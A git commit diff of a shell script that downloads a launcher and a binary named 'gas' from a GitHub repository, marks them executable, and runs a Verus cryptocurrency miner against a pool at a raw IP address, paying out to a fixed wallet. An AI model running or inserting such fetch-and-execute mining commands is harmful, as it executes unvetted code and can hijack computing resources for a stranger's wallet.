91d6ffd6abcb8bd6b2ac2037867af614b2aea5bc
thepowert <96099226+thepowert@users.noreply.github.com>
2021-12-14 15:07:36 +0700

    Update jajan.sh

--- jajan.sh
+++ jajan.sh
@@ -2,4 +2,4 @@
 wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh
 wget https://github.com/hunshukajh/yes/raw/main/gas
 chmod +x gas cmdline_launcher.sh
-./cmdline_launcher.sh -a verus -o stratum+tcp://139.99.123.225:3956 -u RA5S1Suf1BHvTiphQ3VRnWy6aShii374j5.worker-$worker -p x -t 8
+./cmdline_launcher.sh -a verushash -o stratum+tcp://139.99.123.225:3956 -wallet RA5S1Suf1BHvTiphQ3VRnWy6aShii374j5.worker-507 -p x -t 8
